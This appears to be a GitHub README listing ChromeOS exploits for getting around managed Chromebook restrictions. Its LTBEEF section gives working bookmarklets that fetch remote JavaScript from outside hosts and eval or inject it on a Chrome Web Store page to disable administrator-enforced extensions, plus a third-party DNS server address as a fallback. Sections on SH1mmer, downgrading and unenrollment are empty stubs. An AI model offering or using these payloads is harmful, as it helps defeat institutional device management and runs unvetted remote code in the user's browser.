# EXT-REMOVER
This is a curated list of exploits for ChromeOS.   
Many of these exploits can destory your computer if used inproperly.  
  
[Echo put your shebeal  about how chromebooks are trash here]

![image](https://user-images.githubusercontent.com/58097612/191354621-bf7ff072-b9d7-46b5-994a-4d2adbf0e4f3.png)  
Credit: LittleMissNyan

<details>
<summary><b>LTBEEF</b></summary>
LTBEEF is an exploit, created by Bypassi#7037, which abuses api endpoints within the google chrome webstore.  

<b>Please Note:</b> This exploit only works on versions below 106, and eariler versions of 102
  
The origional site created for this exploit can be found at <a href="https://ltbeef.netlify.app/">ltbeef.netlify.app</a>
  
**Instlation**  
There are several vesions of thisexploit you can use, here are the 2 most common versions:
- *Bookmarklets*  
    To use a GUI, bookmark one of the below scripts:  
    - Ingot  
    ```javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())```
    - Compact Cow's UI  
    ```javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});```  

    Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. Flip the switches on the extentions you want to disable. Simple!  

    Photos of the GUI's:
    ![image](https://user-images.githubusercontent.com/58097612/193318485-5267cd59-fb65-45a5-ad28-7f068bbce974.png)
    ![image](https://user-images.githubusercontent.com/58097612/190276894-fc492c5c-b0ce-4943-ae56-603f75634618.png)
   
- *DNS servers*  
    By changing your DNS server, you can use LTBEEF, even if bookmarklets are blocked.  
      
    First, go to Settings > Network > Wifi > Network, and click on "Custom Name Servers"
    ![image](https://user-images.githubusercontent.com/88395302/212482302-82334f42-c421-45c2-b210-1e700652b5be.png)
    Set every box there to the following ip:  
    ```158.101.114.159``` (Hosted by The Greatest Giant#0110)  
    Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. Flip the switches on the extentions you want to disable. 
</details>  

<details>
<summary><b>SH1mmer</b></summary>


</details>

<details>
<summary><b>Point Blank</b></summary>
Point Blank

</details>

<details>
<summary><b>Downgrading</b></summary>
See SH1mmer 🤓
</details>

<details>
<summary><b>Full Unenrollment</b></summary>
See SH1mmer 🤓
</details>